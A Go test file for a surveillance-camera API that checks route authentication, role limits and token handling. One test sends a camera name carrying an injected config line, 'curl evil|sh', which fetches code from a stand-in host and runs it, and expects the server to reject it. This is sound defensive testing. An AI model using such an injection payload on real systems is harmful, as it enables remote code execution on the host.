package main

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/bigbrother/api/internal/alerts"
	"github.com/bigbrother/api/internal/auth"
	"github.com/bigbrother/api/internal/config"
	"github.com/bigbrother/api/internal/mediamtx"
	"github.com/bigbrother/api/internal/middleware"
	"github.com/gin-gonic/gin"
)

const (
	testJWTSecret     = "a-very-long-random-jwt-secret-value-0123456789"
	testInternalToken = "a-very-long-random-internal-token-123"
	testPublishToken  = "a-very-long-random-publish-token-4567"
	testReadToken     = "a-very-long-random-read-token-8901234"
)

// Estos tests no usan base de datos: todas las peticiones se resuelven
// (401/403/404/400) antes de llegar a GORM, o sirven ficheros estáticos.
func setupTestRouter(t *testing.T, allowRegistration bool) (*gin.Engine, *auth.JWTService, string) {
	t.Helper()
	gin.SetMode(gin.TestMode)

	dir := t.TempDir()
	alertsDir := filepath.Join(dir, "alerts")
	if err := os.MkdirAll(alertsDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(alertsDir, "snap.jpg"), []byte("jpeg"), 0o644); err != nil {
		t.Fatal(err)
	}

	cfg := &config.Config{
		AppEnv:            "production",
		JWTSecret:         testJWTSecret,
		InternalToken:     testInternalToken,
		MediaPublishToken: testPublishToken,
		MediaReadToken:    testReadToken,
		AllowRegistration: allowRegistration,
		MediaMTXAPIURL:    "http://127.0.0.1:1",
		DataDir:           dir,
		AlertsDir:         alertsDir,
	}
	jwtSvc := auth.NewJWTService(cfg.JWTSecret)
	r := newRouter(cfg, nil, jwtSvc, mediamtx.NewService(cfg), alerts.NewHub(), nil)
	return r, jwtSvc, alertsDir
}

type reqOpt func(*http.Request)

func bearer(tok string) reqOpt {
	return func(r *http.Request) { r.Header.Set("Authorization", "Bearer "+tok) }
}

func mediaCookie(tok string) reqOpt {
	return func(r *http.Request) { r.AddCookie(&http.Cookie{Name: middleware.MediaCookieName, Value: tok}) }
}

func do(r *gin.Engine, method, path, body string, opts ...reqOpt) *httptest.ResponseRecorder {
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	for _, o := range opts {
		o(req)
	}
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	return w
}

func TestRegisterDisabledByDefault(t *testing.T) {
	r, _, _ := setupTestRouter(t, false)
	w := do(r, http.MethodPost, "/api/auth/register",
		`{"username":"evil","email":"e@e.io","password":"123456","role":"admin"}`)
	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404 for disabled registration, got %d", w.Code)
	}
}

func TestUnauthenticatedAccessIsRejected(t *testing.T) {
	r, _, _ := setupTestRouter(t, false)
	cases := []struct{ method, path string }{
		{http.MethodGet, "/api/alerts/stream"},
		{http.MethodGet, "/api/alerts/snapshots/snap.jpg"},
		{http.MethodGet, "/api/motion/config"},
		{http.MethodPost, "/api/cameras/heartbeat"},
		{http.MethodGet, "/api/media/check"},
		{http.MethodPost, "/api/media/session"},
		{http.MethodGet, "/api/cameras"},
	}
	for _, c := range cases {
		if w := do(r, c.method, c.path, ""); w.Code != http.StatusUnauthorized {
			t.Errorf("%s %s: expected 401, got %d", c.method, c.path, w.Code)
		}
	}
}

func TestMediaCookieGrantsOnlyMediaAccess(t *testing.T) {
	r, jwtSvc, _ := setupTestRouter(t, false)
	media, _ := jwtSvc.GenerateMediaToken("viewer1", "viewer")

	if w := do(r, http.MethodGet, "/api/media/check", "", mediaCookie(media)); w.Code != http.StatusNoContent {
		t.Errorf("media check with cookie: expected 204, got %d", w.Code)
	}
	if w := do(r, http.MethodGet, "/api/alerts/snapshots/snap.jpg", "", mediaCookie(media)); w.Code != http.StatusOK {
		t.Errorf("snapshot with cookie: expected 200, got %d", w.Code)
	}
	// La cookie de medios no debe servir como Bearer para la API REST
	if w := do(r, http.MethodGet, "/api/cameras", "", bearer(media)); w.Code != http.StatusUnauthorized {
		t.Errorf("media token as bearer: expected 401, got %d", w.Code)
	}
	if w := do(r, http.MethodGet, "/api/media/check", "", bearer(media)); w.Code != http.StatusUnauthorized {
		t.Errorf("media token as bearer on media route: expected 401, got %d", w.Code)
	}
}

func TestSessionBearerGrantsMediaAccess(t *testing.T) {
	r, jwtSvc, _ := setupTestRouter(t, false)
	session, _ := jwtSvc.GenerateToken("viewer1", "viewer")
	if w := do(r, http.MethodGet, "/api/media/check", "", bearer(session)); w.Code != http.StatusNoContent {
		t.Errorf("media check with session bearer: expected 204, got %d", w.Code)
	}
}

func TestMotionConfigAndHeartbeatRequireServiceRole(t *testing.T) {
	r, jwtSvc, _ := setupTestRouter(t, false)
	viewer, _ := jwtSvc.GenerateToken("viewer1", "viewer")

	if w := do(r, http.MethodGet, "/api/motion/config", "", bearer(viewer)); w.Code != http.StatusForbidden {
		t.Errorf("motion config as viewer: expected 403, got %d", w.Code)
	}
	if w := do(r, http.MethodPost, "/api/cameras/heartbeat", `{"name":"cam1"}`, bearer(viewer)); w.Code != http.StatusForbidden {
		t.Errorf("heartbeat as viewer: expected 403, got %d", w.Code)
	}
}

func TestHeartbeatRejectsInjectedCameraName(t *testing.T) {
	r, _, _ := setupTestRouter(t, false)
	body := `{"name":"x\non_event_start curl evil|sh"}`
	if w := do(r, http.MethodPost, "/api/cameras/heartbeat", body, bearer(testInternalToken)); w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for malicious camera name, got %d: %s", w.Code, w.Body.String())
	}
}

func TestAlertIngestRequiresInternalToken(t *testing.T) {
	r, jwtSvc, _ := setupTestRouter(t, false)
	admin, _ := jwtSvc.GenerateToken("admin", "admin")
	if w := do(r, http.MethodPost, "/api/alerts", "", bearer(admin)); w.Code != http.StatusUnauthorized {
		t.Errorf("alert ingest with user JWT: expected 401, got %d", w.Code)
	}
	if w := do(r, http.MethodPost, "/api/alerts?token=wrong", ""); w.Code != http.StatusUnauthorized {
		t.Errorf("alert ingest with wrong token: expected 401, got %d", w.Code)
	}
}

func TestMediaMTXAuthEndpoint(t *testing.T) {
	r, _, _ := setupTestRouter(t, false)
	cases := []struct {
		body string
		want int
	}{
		{`{"action":"publish","path":"salon","user":"","password":""}`, http.StatusUnauthorized},
		{`{"action":"publish","path":"salon","user":"publisher","password":"` + testPublishToken + `"}`, http.StatusOK},
		{`{"action":"read","path":"salon","user":"reader","password":"` + testReadToken + `"}`, http.StatusOK},
		{`{"action":"read","path":"salon","user":"publisher","password":"` + testPublishToken + `"}`, http.StatusUnauthorized},
		{`{"action":"api","user":"api","password":"` + testInternalToken + `"}`, http.StatusOK},
		{`not json`, http.StatusBadRequest},
	}
	for _, c := range cases {
		if w := do(r, http.MethodPost, "/internal/mediamtx/auth", c.body); w.Code != c.want {
			t.Errorf("%s: expected %d, got %d", c.body, c.want, w.Code)
		}
	}
	// No debe existir bajo /api (el nginx público solo proxifica /api/)
	if w := do(r, http.MethodPost, "/api/internal/mediamtx/auth", `{}`); w.Code != http.StatusUnauthorized && w.Code != http.StatusNotFound {
		t.Errorf("auth endpoint must not be reachable under /api, got %d", w.Code)
	}
}

func TestPublishCredentialsRequireOperator(t *testing.T) {
	r, jwtSvc, _ := setupTestRouter(t, false)
	viewer, _ := jwtSvc.GenerateToken("viewer1", "viewer")
	operator, _ := jwtSvc.GenerateToken("op1", "operator")

	if w := do(r, http.MethodGet, "/api/media/publish-credentials", ""); w.Code != http.StatusUnauthorized {
		t.Errorf("anonymous: expected 401, got %d", w.Code)
	}
	if w := do(r, http.MethodGet, "/api/media/publish-credentials", "", bearer(viewer)); w.Code != http.StatusForbidden {
		t.Errorf("viewer: expected 403, got %d", w.Code)
	}
	w := do(r, http.MethodGet, "/api/media/publish-credentials", "", bearer(operator))
	if w.Code != http.StatusOK || !strings.Contains(w.Body.String(), testPublishToken) {
		t.Errorf("operator: expected 200 with credentials, got %d", w.Code)
	}
}
